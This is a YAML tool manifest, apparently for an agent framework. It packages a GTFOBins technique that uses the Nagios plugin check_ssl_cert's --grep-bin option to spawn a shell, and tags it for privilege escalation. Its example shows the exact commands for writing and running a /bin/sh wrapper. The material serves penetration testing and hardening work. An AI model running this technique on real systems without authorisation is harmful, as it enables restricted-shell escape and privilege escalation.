---
id: monitoring-nagios-check-ssl-cert
namespace: monitoring:nagios:check-ssl-cert
name: check_ssl_cert
description: Nagios plugin for SSL certificate checking, can spawn a shell via --grep-bin option.
author: "GTFOBins"
version: "1.0.0"
capabilities:
  - security.privilege-escalation.shell
platforms:
  - linux
risk_level: medium
trust_level: community
execution_policy: enabled
architectures:
  - amd64
  - arm64
dependencies: []
related_tools: []
artifacts: []
workflow_edges:
  produces:
    - shell-access
  consumes:
    - execution-context
contract:
  inputs: []
  outputs:
    - type: process.output
      description: Shell output
  side_effects:
    - process_spawn
  resource_cost:
    cpu: low
    memory_mb: 8
    network: low
    disk_io: low
resource_profile:
  cpu: low
  memory_mb: 8
  network: low
  disk_io: low
allowed-tools:
  - check_ssl_cert
  - Bash
  - execFile
parameters: []
features:
  - process-manip
execution:
  template: "check_ssl_cert --grep-bin /path/to/temp-script -H x"
  sandbox: execFile
  timeout_seconds: 30
  shell: false
global_vars: {}
examples:
  - description: Spawn a shell via check_ssl_cert --grep-bin
    command: |
      echo 'exec /bin/sh 0<&2 1>&2' >/path/to/temp-file
      chmod +x /path/to/temp-file
      check_ssl_cert --grep-bin /path/to/temp-file -H x
references:
  - label: "GTFOBins"
    url: "https://gtfobins.github.io/gtfobins/check_ssl_cert/"
techniques:
  - privilege-escalation
  - execution
install:
  - method: apt
    package_name: "monitoring-plugins"
    commands:
      - "apt-get install -y monitoring-plugins"
---
